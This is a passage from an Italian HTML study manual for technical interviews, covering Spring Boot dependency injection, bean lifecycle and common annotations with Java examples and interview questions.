<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Manuale Definitivo per Colloqui Tecnici 2026</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet">
    <style>
        :root {
            --bg-primary: #0d1117;
            --bg-secondary: #161b22;
            --bg-tertiary: #21262d;
            --text-primary: #e6edf3;
            --text-secondary: #8b949e;
            --accent-primary: #58a6ff;
            --accent-secondary: #238636;
            --accent-warning: #d29922;
            --accent-danger: #f85149;
            --border-color: #30363d;
            --code-bg: #1a1f26;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Noto Sans', Helvetica, Arial, sans-serif;
            background-color: var(--bg-primary);
            color: var(--text-primary);
            line-height: 1.6;
        }

        /* Layout */
        .container {
            display: flex;
            min-height: 100vh;
        }

        /* Sidebar */
        .sidebar {
            width: 280px;
            background-color: var(--bg-secondary);
            border-right: 1px solid var(--border-color);
            position: fixed;
            height: 100vh;
            overflow-y: auto;
            padding: 20px 0;
        }

        .sidebar-header {
            padding: 0 20px 20px;
            border-bottom: 1px solid var(--border-color);
            margin-bottom: 15px;
        }

        .sidebar-header h1 {
            font-size: 1.2rem;
            color: var(--accent-primary);
            margin-bottom: 5px;
        }

        .sidebar-header span {
            font-size: 0.85rem;
            color: var(--text-secondary);
        }

        .nav-section {
            padding: 10px 20px;
        }

        .nav-section h3 {
            font-size: 0.75rem;
            text-transform: uppercase;
            color: var(--text-secondary);
            margin-bottom: 10px;
            letter-spacing: 0.5px;
        }

        .nav-link {
            display: block;
            padding: 8px 12px;
            color: var(--text-primary);
            text-decoration: none;
            border-radius: 6px;
            margin-bottom: 4px;
            font-size: 0.9rem;
            transition: background-color 0.2s;
        }

        .nav-link:hover {
            background-color: var(--bg-tertiary);
        }

        .nav-link.active {
            background-color: var(--bg-tertiary);
            color: var(--accent-primary);
            font-weight: 500;
        }

        .nav-sublink {
            padding-left: 24px;
            font-size: 0.85rem;
            color: var(--text-secondary);
        }

        /* Main Content */
        .main-content {
            margin-left: 280px;
            flex: 1;
            padding: 40px 60px;
            max-width: 900px;
        }

        .module-header {
            margin-bottom: 40px;
            padding-bottom: 20px;
            border-bottom: 1px solid var(--border-color);
        }

        .module-tag {
            display: inline-block;
            background-color: var(--accent-primary);
            color: var(--bg-primary);
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 0.8rem;
            font-weight: 600;
            margin-bottom: 15px;
        }

        .module-header h1 {
            font-size: 2.2rem;
            margin-bottom: 10px;
        }

        .module-header p {
            color: var(--text-secondary);
            font-size: 1.1rem;
        }

        /* Content Sections */
        .section {
            margin-bottom: 50px;
        }

        .section h2 {
            font-size: 1.5rem;
            margin-bottom: 20px;
            color: var(--accent-primary);
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .section h2::before {
            content: "►";
            font-size: 0.8rem;
        }

        .section h3 {
            font-size: 1.2rem;
            margin: 25px 0 15px;
            color: var(--text-primary);
        }

        .section p {
            margin-bottom: 15px;
            color: var(--text-secondary);
        }

        /* Info Box */
        .info-box {
            background-color: var(--bg-secondary);
            border: 1px solid var(--border-color);
            border-left: 4px solid var(--accent-primary);
            border-radius: 6px;
            padding: 20px;
            margin: 20px 0;
        }

        .info-box.warning {
            border-left-color: var(--accent-warning);
        }

        .info-box.success {
            border-left-color: var(--accent-secondary);
        }

        .info-box h4 {
            color: var(--accent-primary);
            margin-bottom: 10px;
            font-size: 1rem;
        }

        .info-box.warning h4 {
            color: var(--accent-warning);
        }

        .info-box.success h4 {
            color: var(--accent-secondary);
        }

        /* Code Blocks */
        pre {
            background-color: var(--code-bg) !important;
            border: 1px solid var(--border-color);
            border-radius: 8px;
            padding: 20px !important;
            margin: 20px 0 !important;
            overflow-x: auto;
        }

        code {
            font-family: 'Fira Code', 'Consolas', 'Monaco', monospace;
            font-size: 0.9rem;
        }

        :not(pre) > code {
            background-color: var(--bg-tertiary);
            padding: 2px 8px;
            border-radius: 4px;
            color: var(--accent-primary);
        }

        /* Lists */
        ul, ol {
            margin: 15px 0;
            padding-left: 25px;
            color: var(--text-secondary);
        }

        li {
            margin-bottom: 8px;
        }

        /* Tables */
        table {
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
        }

        th, td {
            padding: 12px 15px;
            text-align: left;
            border: 1px solid var(--border-color);
        }

        th {
            background-color: var(--bg-secondary);
            color: var(--accent-primary);
            font-weight: 600;
        }

        td {
            color: var(--text-secondary);
        }

        tr:hover td {
            background-color: var(--bg-secondary);
        }

        /* Quiz Section */
        .quiz-section {
            background-color: var(--bg-secondary);
            border: 1px solid var(--border-color);
            border-radius: 12px;
            padding: 30px;
            margin-top: 50px;
        }

        .quiz-section h2 {
            color: var(--accent-warning);
            margin-bottom: 25px;
        }

        .quiz-section h2::before {
            content: "⚡";
        }

        .quiz-question {
            margin-bottom: 30px;
            padding-bottom: 30px;
            border-bottom: 1px solid var(--border-color);
        }

        .quiz-question:last-of-type {
            border-bottom: none;
        }

        .quiz-question h4 {
            font-size: 1.1rem;
            margin-bottom: 15px;
            color: var(--text-primary);
        }

        .quiz-question h4 span {
            color: var(--accent-warning);
        }

        .quiz-options {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        .quiz-option {
            display: flex;
            align-items: flex-start;
            gap: 12px;
            padding: 15px;
            background-color: var(--bg-tertiary);
            border: 2px solid var(--border-color);
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.2s;
        }

        .quiz-option:hover {
            border-color: var(--accent-primary);
        }

        .quiz-option input {
            margin-top: 3px;
            accent-color: var(--accent-primary);
        }

        .quiz-option label {
            cursor: pointer;
            color: var(--text-secondary);
            flex: 1;
        }

        .quiz-option.correct {
            border-color: var(--accent-secondary);
            background-color: rgba(35, 134, 54, 0.1);
        }

        .quiz-option.incorrect {
            border-color: var(--accent-danger);
            background-color: rgba(248, 81, 73, 0.1);
        }

        .feedback {
            display: none;
            margin-top: 15px;
            padding: 15px;
            border-radius: 8px;
            font-size: 0.95rem;
        }

        .feedback.correct {
            display: block;
            background-color: rgba(35, 134, 54, 0.15);
            border: 1px solid var(--accent-secondary);
            color: var(--accent-secondary);
        }

        .feedback.incorrect {
            display: block;
            background-color: rgba(248, 81, 73, 0.15);
            border: 1px solid var(--accent-danger);
            color: var(--text-primary);
        }

        .feedback strong {
            display: block;
            margin-bottom: 8px;
        }

        .check-btn {
            background-color: var(--accent-primary);
            color: var(--bg-primary);
            border: none;
            padding: 12px 24px;
            border-radius: 8px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            margin-top: 10px;
            transition: opacity 0.2s;
        }

        .check-btn:hover {
            opacity: 0.9;
        }

        .check-btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        /* Diagram */
        .diagram {
            background-color: var(--bg-tertiary);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            padding: 30px;
            margin: 25px 0;
            text-align: center;
            font-family: 'Fira Code', monospace;
            overflow-x: auto;
        }

        .diagram pre {
            background: transparent !important;
            border: none;
            padding: 0 !important;
            margin: 0 !important;
            text-align: left;
            display: inline-block;
        }

        /* Responsive */
        @media (max-width: 1024px) {
            .sidebar {
                width: 60px;
                padding: 15px 5px;
            }

            .sidebar-header, .nav-section h3, .nav-link span {
                display: none;
            }

            .nav-link {
                text-align: center;
                padding: 12px;
            }

            .main-content {
                margin-left: 60px;
                padding: 30px;
            }
        }

        @media (max-width: 768px) {
            .sidebar {
                display: none;
            }

            .main-content {
                margin-left: 0;
                padding: 20px;
            }

            .module-header h1 {
                font-size: 1.8rem;
            }
        }

        /* Scrollbar */
        ::-webkit-scrollbar {
            width: 8px;
            height: 8px;
        }

        ::-webkit-scrollbar-track {
            background: var(--bg-primary);
        }

        ::-webkit-scrollbar-thumb {
            background: var(--border-color);
            border-radius: 4px;
        }

        ::-webkit-scrollbar-thumb:hover {
            background: var(--text-secondary);
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Sidebar Navigation -->
        <nav class="sidebar">
            <div class="sidebar-header">
                <h1>Tech Interview 2026</h1>
                <span>Manuale Definitivo</span>
            </div>

            <div class="nav-section">
                <h3>Moduli</h3>
                <a href="#modulo1" class="nav-link active">
                    <span>1. Java & Spring Boot</span>
                </a>
                <a href="#modulo1-ioc" class="nav-link nav-sublink">IoC & Bean Lifecycle</a>
                <a href="#modulo1-annotations" class="nav-link nav-sublink">Spring Annotations</a>
                <a href="#modulo1-proxy" class="nav-link nav-sublink">Proxy Pattern</a>
                <a href="#modulo1-transactional" class="nav-link nav-sublink">@Transactional</a>
                <a href="#modulo1-security" class="nav-link nav-sublink">Spring Security</a>
                <a href="#modulo1-jpa" class="nav-link nav-sublink">JPA & N+1</a>
                <a href="#modulo1-quiz" class="nav-link nav-sublink">Quiz</a>

                <a href="#modulo2" class="nav-link"><span>2. Testing Strategy</span></a>
                <a href="#modulo2-pyramid" class="nav-link nav-sublink">Test Pyramid</a>
                <a href="#modulo2-types" class="nav-link nav-sublink">Unit vs Integration vs E2E</a>
                <a href="#modulo2-mocking" class="nav-link nav-sublink">Mocking vs Stubbing</a>
                <a href="#modulo2-quiz" class="nav-link nav-sublink">Quiz</a>

                <a href="#modulo3" class="nav-link"><span>3. Architettura & Scalabilità</span></a>
                <a href="#modulo3-monolith-micro" class="nav-link nav-sublink">Monoliti vs Microservizi</a>
                <a href="#modulo3-resilience" class="nav-link nav-sublink">Resilience Patterns</a>
                <a href="#modulo3-cap" class="nav-link nav-sublink">CAP Theorem</a>
                <a href="#modulo3-loadbalancing" class="nav-link nav-sublink">Load Balancing</a>
                <a href="#modulo3-caching" class="nav-link nav-sublink">Caching Strategies</a>
                <a href="#modulo3-quiz" class="nav-link nav-sublink">Quiz</a>

                <a href="#modulo4" class="nav-link"><span>4. Database & Messaging</span></a>
                <a href="#modulo4-sql-nosql" class="nav-link nav-sublink">SQL vs NoSQL</a>
                <a href="#modulo4-kafka" class="nav-link nav-sublink">Apache Kafka</a>
                <a href="#modulo4-rabbitmq" class="nav-link nav-sublink">RabbitMQ</a>
                <a href="#modulo4-comparison" class="nav-link nav-sublink">Kafka vs RabbitMQ</a>
                <a href="#modulo4-quiz" class="nav-link nav-sublink">Quiz</a>

                <a href="#modulo5" class="nav-link"><span>5. Cloud & DevOps</span></a>
                <a href="#modulo5-docker" class="nav-link nav-sublink">Docker</a>
                <a href="#modulo5-kubernetes" class="nav-link nav-sublink">Kubernetes</a>
                <a href="#modulo5-cicd" class="nav-link nav-sublink">CI/CD Pipelines</a>
                <a href="#modulo5-deployment" class="nav-link nav-sublink">Deployment Strategies</a>
                <a href="#modulo5-quiz" class="nav-link nav-sublink">Quiz</a>

                <a href="#modulo6" class="nav-link"><span>6. Advanced Topics 2026</span></a>
                <a href="#modulo6-observability" class="nav-link nav-sublink">Observability</a>
                <a href="#modulo6-terraform" class="nav-link nav-sublink">Infrastructure as Code</a>
                <a href="#modulo6-ai" class="nav-link nav-sublink">LLM & AI Integration</a>
                <a href="#modulo6-quiz" class="nav-link nav-sublink">Quiz</a>

                <a href="#modulo7" class="nav-link"><span>7. Coding Challenges</span></a>
                <a href="#modulo7-lru" class="nav-link nav-sublink">LRU Cache</a>
                <a href="#modulo7-parentheses" class="nav-link nav-sublink">Valid Parentheses</a>
                <a href="#modulo7-intervals" class="nav-link nav-sublink">Merge Intervals</a>
                <a href="#modulo7-quiz" class="nav-link nav-sublink">Quiz</a>

                <a href="#modulo8" class="nav-link"><span>8. Paradigmi di Programmazione</span></a>
                <a href="#modulo8-functional" class="nav-link nav-sublink">Programmazione Funzionale</a>
                <a href="#modulo8-streams" class="nav-link nav-sublink">Java Streams</a>
                <a href="#modulo8-comparison" class="nav-link nav-sublink">OOP vs FP</a>
                <a href="#modulo8-quiz" class="nav-link nav-sublink">Quiz</a>

                <a href="#modulo9" class="nav-link"><span>9. API Design</span></a>
                <a href="#modulo9-rest" class="nav-link nav-sublink">REST Best Practices</a>
                <a href="#modulo9-versioning" class="nav-link nav-sublink">Versioning & Errors</a>
                <a href="#modulo9-comparison" class="nav-link nav-sublink">REST vs GraphQL vs gRPC</a>
                <a href="#modulo9-quiz" class="nav-link nav-sublink">Quiz</a>

                <a href="#modulo10" class="nav-link"><span>10. Security</span></a>
                <a href="#modulo10-owasp" class="nav-link nav-sublink">OWASP Top 10</a>
                <a href="#modulo10-auth" class="nav-link nav-sublink">Authentication</a>
                <a href="#modulo10-authorization" class="nav-link nav-sublink">Authorization</a>
                <a href="#modulo10-quiz" class="nav-link nav-sublink">Quiz</a>

                <a href="#modulo11" class="nav-link"><span>11. DDD & Clean Architecture</span></a>
                <a href="#modulo11-ddd" class="nav-link nav-sublink">Domain Driven Design</a>
                <a href="#modulo11-clean" class="nav-link nav-sublink">Clean Architecture</a>
                <a href="#modulo11-cqrs" class="nav-link nav-sublink">Event Sourcing & CQRS</a>
                <a href="#modulo11-quiz" class="nav-link nav-sublink">Quiz</a>

                <a href="#modulo12" class="nav-link"><span>12. Data Structures</span></a>
                <a href="#modulo12-trees" class="nav-link nav-sublink">Trees & Tries</a>
                <a href="#modulo12-graphs" class="nav-link nav-sublink">Graphs</a>
                <a href="#modulo12-heaps" class="nav-link nav-sublink">Heaps & Priority Queue</a>
                <a href="#modulo12-quiz" class="nav-link nav-sublink">Quiz</a>
            </div>
        </nav>

        <!-- Main Content -->
        <main class="main-content">
            <header class="module-header" id="modulo1">
                <span class="module-tag">Modulo 1</span>
                <h1>Java & Spring Boot Deep Dive</h1>
                <p>Comprensione avanzata del framework Spring, dal container IoC alla gestione delle transazioni</p>
            </header>

            <!-- IoC Section -->
            <section class="section" id="modulo1-ioc">
                <h2>Inversion of Control & Dependency Injection</h2>

                <p>L'<strong>Inversion of Control</strong> (IoC) è un principio di design in cui il controllo del flusso di un programma viene invertito rispetto alla programmazione tradizionale. Invece di essere il nostro codice a creare e gestire le dipendenze, deleghiamo questa responsabilità a un <em>container</em>.</p>

                <div class="info-box">
                    <h4>Differenza chiave</h4>
                    <p>Nella programmazione tradizionale, la classe A crea direttamente un'istanza di B (<code>new B()</code>). Con IoC, la classe A dichiara di aver bisogno di B, e il container si occupa di fornirla (<strong>Dependency Injection</strong>).</p>
                </div>

                <h3>Tipi di Dependency Injection in Spring</h3>

                <table>
                    <thead>
                        <tr>
                            <th>Tipo</th>
                            <th>Pro</th>
                            <th>Contro</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><code>Constructor Injection</code></td>
                            <td>Immutabilità, dipendenze obbligatorie esplicite, testabilità</td>
                            <td>Costruttori verbosi con molte dipendenze</td>
                        </tr>
                        <tr>
                            <td><code>Setter Injection</code></td>
                            <td>Dipendenze opzionali, riconfigurabilità</td>
                            <td>Oggetti potenzialmente in stato incompleto</td>
                        </tr>
                        <tr>
                            <td><code>Field Injection</code></td>
                            <td>Codice conciso</td>
                            <td>Difficile da testare, nasconde le dipendenze</td>
                        </tr>
                    </tbody>
                </table>

                <div class="info-box success">
                    <h4>Best Practice</h4>
                    <p>Preferisci sempre <strong>Constructor Injection</strong>. È l'approccio raccomandato dal team Spring perché garantisce l'immutabilità del bean e rende le dipendenze esplicite. Con Lombok, puoi usare <code>@RequiredArgsConstructor</code> per evitare boilerplate.</p>
                </div>

                <pre><code class="language-java">// ❌ Field Injection - da evitare
@Service
public class OrderService {
    @Autowired
    private PaymentService paymentService;
}

// ✅ Constructor Injection - approccio consigliato
@Service
@RequiredArgsConstructor
public class OrderService {
    private final PaymentService paymentService;
    private final InventoryService inventoryService;

    // Lombok genera il costruttore automaticamente
}</code></pre>

                <h3>Bean Lifecycle</h3>

                <p>Comprendere il ciclo di vita di un Bean è fondamentale per gestire correttamente l'inizializzazione delle risorse e il cleanup. Ecco le fasi principali:</p>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                         SPRING BEAN LIFECYCLE                               │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   1. INSTANTIATION                                                          │
│      └── Spring crea l'istanza del bean (new o reflection)                  │
│                           │                                                 │
│                           ▼                                                 │
│   2. POPULATE PROPERTIES                                                    │
│      └── Dependency Injection (constructor, setter, field)                  │
│                           │                                                 │
│                           ▼                                                 │
│   3. BEAN NAME AWARE                                                        │
│      └── setBeanName() se implementa BeanNameAware                          │
│                           │                                                 │
│                           ▼                                                 │
│   4. BEAN FACTORY AWARE                                                     │
│      └── setBeanFactory() se implementa BeanFactoryAware                    │
│                           │                                                 │
│                           ▼                                                 │
│   5. PRE-INITIALIZATION (BeanPostProcessor)                                 │
│      └── postProcessBeforeInitialization()                                  │
│                           │                                                 │
│                           ▼                                                 │
│   6. INITIALIZATION                                                         │
│      ├── @PostConstruct                                                     │
│      ├── InitializingBean.afterPropertiesSet()                              │
│      └── Custom init-method                                                 │
│                           │                                                 │
│                           ▼                                                 │
│   7. POST-INITIALIZATION (BeanPostProcessor)                                │
│      └── postProcessAfterInitialization()                                   │
│          ⚠️  Qui vengono creati i PROXY (AOP, @Transactional)               │
│                           │                                                 │
│                           ▼                                                 │
│   8. BEAN READY                                                             │
│      └── Il bean è pronto per l'uso                                         │
│                           │                                                 │
│                           ▼                                                 │
│   9. DESTRUCTION (alla chiusura del context)                                │
│      ├── @PreDestroy                                                        │
│      ├── DisposableBean.destroy()                                           │
│      └── Custom destroy-method                                              │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <pre><code class="language-java">@Component
public class DatabaseConnectionPool implements InitializingBean, DisposableBean {

    private Connection connection;

    @PostConstruct
    public void init() {
        // Eseguito DOPO la dependency injection
        // Ideale per logica di inizializzazione leggera
        log.info("PostConstruct: inizializzazione risorse");
    }

    @Override
    public void afterPropertiesSet() throws Exception {
        // Eseguito DOPO @PostConstruct
        // Usato quando si ha bisogno di accesso al BeanFactory
        this.connection = dataSource.getConnection();
    }

    @PreDestroy
    public void cleanup() {
        // Eseguito durante lo shutdown del context
        // Rilascia risorse, chiudi connessioni
        if (connection != null) {
            connection.close();
        }
    }

    @Override
    public void destroy() throws Exception {
        // Eseguito DOPO @PreDestroy
        log.info("Bean destroyed");
    }
}</code></pre>

                <div class="info-box warning">
                    <h4>Domanda frequente ai colloqui</h4>
                    <p>"Qual è la differenza tra <code>@PostConstruct</code> e il costruttore?"<br><br>
                    <strong>Risposta:</strong> Il costruttore viene chiamato <em>prima</em> che le dipendenze vengano iniettate (nel caso di setter/field injection). <code>@PostConstruct</code> viene chiamato <em>dopo</em> che tutte le dipendenze sono state iniettate, quindi è il posto sicuro per usare le dipendenze iniettate.</p>
                </div>
            </section>

            <!-- Spring Annotations Section -->
            <section class="section" id="modulo1-annotations">
                <h2>Spring Annotations - Le più richieste ai colloqui</h2>

                <p>Le annotation sono il cuore di Spring Boot. Conoscere le differenze sottili tra annotation simili è spesso oggetto di domande nei colloqui tecnici.</p>

                <h3>Core Stereotype Annotations</h3>

                <table>
                    <thead>
                        <tr>
                            <th>Annotation</th>
                            <th>Descrizione</th>
                            <th>Layer</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><code>@Component</code></td>
                            <td>Annotation generica per qualsiasi bean Spring</td>
                            <td>Generico</td>
                        </tr>
                        <tr>
                            <td><code>@Service</code></td>
                            <td>Specializzazione di @Component per la business logic</td>
                            <td>Service Layer</td>
                        </tr>
                        <tr>
                            <td><code>@Repository</code></td>
                            <td>Specializzazione per DAO/persistence. Abilita la traduzione delle eccezioni DB</td>
                            <td>Data Access Layer</td>
                        </tr>
                        <tr>
                            <td><code>@Controller</code></td>
                            <td>Per MVC controllers che ritornano views</td>
                            <td>Web Layer</td>
                        </tr>
                        <tr>
                            <td><code>@RestController</code></td>
                            <td><code>@Controller</code> + <code>@ResponseBody</code> su ogni metodo</td>
                            <td>Web Layer (REST)</td>
                        </tr>
                        <tr>
                            <td><code>@Configuration</code></td>
                            <td>Classe che contiene definizioni di bean (<code>@Bean</code> methods)</td>
                            <td>Configuration</td>
                        </tr>
                    </tbody>
                </table>

                <div class="info-box">
                    <h4>Domanda da colloquio</h4>
                    <p>"Qual è la differenza funzionale tra <code>@Service</code> e <code>@Component</code>?"<br><br>
                    <strong>Risposta:</strong> A livello funzionale, nessuna. Entrambi registrano un bean nel container. La differenza è <em>semantica</em>: <code>@Service</code> comunica l'intento (business logic), facilita la lettura del codice, e permette l'applicazione di AOP specifici per layer (es: logging solo sui service).</p>
                </div>

                <h3>Dependency Injection Annotations</h3>

                <pre><code class="language-java">// @Autowired - Injection automatica per tipo
@Service
public class OrderService {
    @Autowired  // Field injection (sconsigliato)
    private PaymentService paymentService;

    @Autowired  // Setter injection
    public void setPaymentService(PaymentService paymentService) {
        this.paymentService = paymentService;
    }

    @Autowired  // Constructor injection (consigliato)
    public OrderService(PaymentService paymentService) {
        this.paymentService = paymentService;
    }
}

// @Qualifier - Disambigua quando ci sono più bean dello stesso tipo
@Service
public class NotificationService {
    @Autowired
    @Qualifier("emailSender")  // Specifica quale implementazione usare
    private MessageSender sender;
}

// @Primary - Indica il bean preferito quando ce ne sono multipli
@Configuration
public class SenderConfig {
    @Bean
    @Primary  // Questo sarà iniettato di default
    public MessageSender emailSender() {
        return new EmailSender();
    }

    @Bean
    public MessageSender smsSender() {
        return new SmsSender();
    }
}

// @Value - Inietta valori da properties
@Component
public class AppConfig {
    @Value("${app.name}")
    private String appName;

    @Value("${app.timeout:30}")  // Con valore di default
    private int timeout;

    @Value("#{systemProperties['user.home']}")  // SpEL expression
    private String userHome;
}</code></pre>

                <h3>Bean Scope Annotations</h3>

                <pre><code class="language-java">// @Scope - Definisce il lifecycle del bean
@Component
@Scope("singleton")  // Default: una sola istanza per ApplicationContext
public class SingletonBean { }

@Component
@Scope("prototype")  // Nuova istanza ad ogni injection/richiesta
public class PrototypeBean { }

@Component
@Scope(value = WebApplicationContext.SCOPE_REQUEST, proxyMode = ScopedProxyMode.TARGET_CLASS)
public class RequestScopedBean { }  // Una istanza per HTTP request

@Component
@Scope(value = WebApplicationContext.SCOPE_SESSION, proxyMode = ScopedProxyMode.TARGET_CLASS)
public class SessionScopedBean { }  // Una istanza per HTTP session</code></pre>

                <div class="info-box warning">
                    <h4>Attenzione: Prototype in Singleton</h4>
                    <p>Se inietti un bean <code>prototype</code> in un <code>singleton</code>, il prototype viene creato UNA sola volta (al momento dell'injection nel singleton). Per ottenere una nuova istanza ogni volta, usa <code>ObjectFactory&lt;T&gt;</code>, <code>Provider&lt;T&gt;</code>, o <code>@Lookup</code>.</p>
                </div>

                <pre><code class="language-java">// Soluzione con Provider per prototype injection
@Service
public class OrderService {
    private final Provider&lt;ShoppingCart&gt; cartProvider;

    public OrderService(Provider&lt;ShoppingCart&gt; cartProvider) {
        this.cartProvider = cartProvider;
    }

    public void processOrder() {
        ShoppingCart cart = cartProvider.get();  // Nuova istanza ogni volta
    }
}

// Soluzione con @Lookup
@Service
public abstract class OrderService {
    @Lookup
    protected abstract ShoppingCart getShoppingCart();  // Spring sovrascrive questo metodo

    public void processOrder() {
        ShoppingCart cart = getShoppingCart();  // Nuova istanza ogni volta
    }
}</code></pre>

                <h3>Conditional Annotations</h3>

                <pre><code class="language-java">// @Conditional - Registra bean solo se la condizione è vera
@Configuration
public class DatabaseConfig {

    @Bean
    @ConditionalOnProperty(name = "db.type", havingValue = "mysql")
    public DataSource mysqlDataSource() {
        return new MysqlDataSource();
    }

    @Bean
    @ConditionalOnProperty(name = "db.type", havingValue = "postgres")
    public DataSource postgresDataSource() {
        return new PostgresDataSource();
    }

    @Bean
    @ConditionalOnMissingBean(DataSource.class)  // Solo se nessun DataSource è già definito
    public DataSource defaultDataSource() {
        return new H2DataSource();
    }
}

// @Profile - Attiva bean solo per profili specifici
@Configuration
@Profile("dev")
public class DevConfig {
    @Bean
    public EmailService emailService() {
        return new MockEmailService();  // Non invia email vere in dev
    }
}

@Configuration
@Profile("prod")
public class ProdConfig {
    @Bean
    public EmailService emailService() {
        return new SmtpEmailService();
    }
}

// Attivare profili: --spring.profiles.active=dev,local</code></pre>

                <h3>Web Layer Annotations</h3>

                <pre><code class="language-java">@RestController
@RequestMapping("/api/v1/users")
public class UserController {

    // @GetMapping - HTTP GET
    @GetMapping("/{id}")
    public ResponseEntity&lt;User&gt; getUser(@PathVariable Long id) {
        return ResponseEntity.ok(userService.findById(id));
    }

    // @PostMapping - HTTP POST
    @PostMapping
    @ResponseStatus(HttpStatus.CREATED)
    public User createUser(@RequestBody @Valid CreateUserRequest request) {
        return userService.create(request);
    }

    // @PutMapping - HTTP PUT (replace)
    @PutMapping("/{id}")
    public User updateUser(@PathVariable Long id, @RequestBody UpdateUserRequest request) {
        return userService.update(id, request);
    }

    // @PatchMapping - HTTP PATCH (partial update)
    @PatchMapping("/{id}")
    public User patchUser(@PathVariable Long id, @RequestBody Map&lt;String, Object&gt; updates) {
        return userService.patch(id, updates);
    }

    // @DeleteMapping - HTTP DELETE
    @DeleteMapping("/{id}")
    @ResponseStatus(HttpStatus.NO_CONTENT)
    public void deleteUser(@PathVariable Long id) {
        userService.delete(id);
    }

    // Query parameters
    @GetMapping
    public Page&lt;User&gt; searchUsers(
            @RequestParam(required = false) String name,
            @RequestParam(defaultValue = "0") int page,
            @RequestParam(defaultValue = "20") int size) {
        return userService.search(name, PageRequest.of(page, size));
    }

    // Headers
    @GetMapping("/me")
    public User getCurrentUser(@RequestHeader("Authorization") String token) {
        return userService.fromToken(token);
    }
}</code></pre>

                <h3>Validation Annotations</h3>

                <pre><code class="language-java">public class CreateUserRequest {

    @NotNull(message = "Il nome è obbligatorio")
    @Size(min = 2, max = 50, message = "Il nome deve essere tra 2 e 50 caratteri")
    private String name;

    @NotBlank
    @Email(message = "Email non valida")
    private String email;

    @NotNull
    @Min(value = 18, message = "Devi avere almeno 18 anni")
    @Max(value = 120)
    private Integer age;

    @Pattern(regexp = "^\\+?[1-9]\\d{1,14}$", message = "Numero di telefono non valido")
    private String phone;

    @Valid  // Valida anche l'oggetto nested
    @NotNull
    private Address address;
}

public class Address {
    @NotBlank
    private String street;

    @NotBlank
    @Size(min = 5, max = 5, message = "CAP deve essere di 5 cifre")
    private String zipCode;
}

// Nel controller
@PostMapping
public User createUser(@RequestBody @Valid CreateUserRequest request) {
    // Se la validazione fallisce, viene lanciata MethodArgumentNotValidException
    return userService.create(request);
}

// Custom validator
@Target({ElementType.FIELD})
@Retention(RetentionPolicy.RUNTIME)
@Constraint(validatedBy = UniqueEmailValidator.class)
public @interface UniqueEmail {
    String message() default "Email già registrata";
    Class&lt;?&gt;[] groups() default {};
    Class&lt;? extends Payload&gt;[] payload() default {};
}

public class UniqueEmailValidator implements ConstraintValidator&lt;UniqueEmail, String&gt; {
    @Autowired
    private UserRepository userRepository;

    @Override
    public boolean isValid(String email, ConstraintValidatorContext context) {
        return !userRepository.existsByEmail(email);
    }
}</code></pre>

                <h3>JPA Annotations</h3>

                <pre><code class="language-java">@Entity
@Table(name = "users", indexes = {
    @Index(name = "idx_email", columnList = "email", unique = true)
})
public class User {

    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;

    @Column(nullable = false, length = 100)
    private String name;

    @Column(unique = true, nullable = false)
    private String email;

    @Enumerated(EnumType.STRING)  // Salva il nome dell'enum, non l'ordinale
    private UserStatus status;

    @Embedded
    private Address address;

    @OneToMany(mappedBy = "user", cascade = CascadeType.ALL, orphanRemoval = true)
    private List&lt;Order&gt; orders = new ArrayList&lt;&gt;();

    @ManyToMany
    @JoinTable(
        name = "user_roles",
        joinColumns = @JoinColumn(name = "user_id"),
        inverseJoinColumns = @JoinColumn(name = "role_id")
    )
    private Set&lt;Role&gt; roles = new HashSet&lt;&gt;();

    @CreatedDate
    @Column(updatable = false)
    private LocalDateTime createdAt;

    @LastModifiedDate
    private LocalDateTime updatedAt;

    @Version  // Optimistic locking
    private Long version;

    @Transient  // Non persistito nel DB
    private String temporaryToken;
}

@Embeddable
public class Address {
    private String street;
    private String city;
    private String zipCode;
}</code></pre>

                <h3>Caching Annotations</h3>

                <pre><code class="language-java">@Configuration
@EnableCaching
public class CacheConfig { }

@Service
public class ProductService {

    @Cacheable(value = "products", key = "#id")
    public Product findById(Long id) {
        // Chiamato solo se non in cache
        return productRepository.findById(id).orElseThrow();
    }

    @Cacheable(value = "products", key = "#root.method.name + #category")
    public List&lt;Product&gt; findByCategory(String category) {
        return productRepository.findByCategory(category);
    }

    @CachePut(value = "products", key = "#product.id")
    public Product update(Product product) {
        // Aggiorna sempre la cache con il risultato
        return productRepository.save(product);
    }

    @CacheEvict(value = "products", key = "#id")
    public void delete(Long id) {
        // Rimuove dalla cache
        productRepository.deleteById(id);
    }

    @CacheEvict(value = "products", allEntries = true)
    public void clearCache() {
        // Svuota tutta la cache "products"
    }

    @Caching(evict = {
        @CacheEvict(value = "products", key = "#product.id"),
        @CacheEvict(value = "categories", key = "#product.category")
    })
    public void updateWithCategoryChange(Product product) {
        productRepository.save(product);
    }
}</code></pre>

                <h3>Async & Scheduling Annotations</h3>

                <pre><code class="language-java">@Configuration
@EnableAsync
@EnableScheduling
public class AsyncConfig {

    @Bean
    public Executor taskExecutor() {
        ThreadPoolTaskExecutor executor = new ThreadPoolTaskExecutor();
        executor.setCorePoolSize(5);
        executor.setMaxPoolSize(10);
        executor.setQueueCapacity(25);
        executor.setThreadNamePrefix("Async-");
        return executor;
    }
}

@Service
public class NotificationService {

    @Async  // Eseguito in un thread separato
    public void sendEmailAsync(String to, String message) {
        // Non blocca il chiamante
        emailClient.send(to, message);
    }

